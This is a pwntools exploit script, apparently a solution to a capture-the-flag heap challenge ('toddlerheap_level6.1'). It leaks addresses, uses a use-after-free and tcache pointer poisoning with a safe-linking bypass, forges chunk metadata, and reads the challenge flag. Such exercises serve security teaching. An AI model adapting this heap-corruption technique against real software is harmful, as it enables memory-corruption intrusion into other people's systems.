from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/toddlerheap_level6.1")

def calloc(idx,size):
    p.sendline("calloc "+str(idx)+" "+str(size))
def free(idx):
    p.sendline("free "+str(idx))
def puts(idx):
    p.sendline("puts "+str(idx))
def qt():
    p.sendline("quit")
def read(idx,payload):
    p.sendline("safer_read "+str(idx))
    p.recvuntil("read",drop=True)
    print(p.recvline())
    p.send(payload)
    print(p.recv())
def send_flag():
    p.sendline("send_flag")
def global_read(payload):
    p.sendline("read_to_global")
    p.sendlineafter("read_size: ",str(len(payload)))
    p.send(payload)
p.recvuntil("Reading the flag into 0x",drop=True)
flag_addr=int(p.recvuntil(".\n",drop=True),16)
print("[LEAK]:flag_addr=",hex(flag_addr))
for i in range(7):
    calloc(0,24)
    free(0)
calloc(0,24)
calloc(1,24)
free(1)
puts(1)
p.recvuntil("Data: ",drop=True)
pos=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))
print("[LEAK]:pos=",hex(pos))
free(0)
read(0,p64(pos^(flag_addr-40)))
global_read(b'\x00'*0x2A0+p64(0)+p64(0x20))
calloc(0,24)
calloc(0,24)
read(0,b'a'*24)
puts(0)
print(p.recvall())
qt()
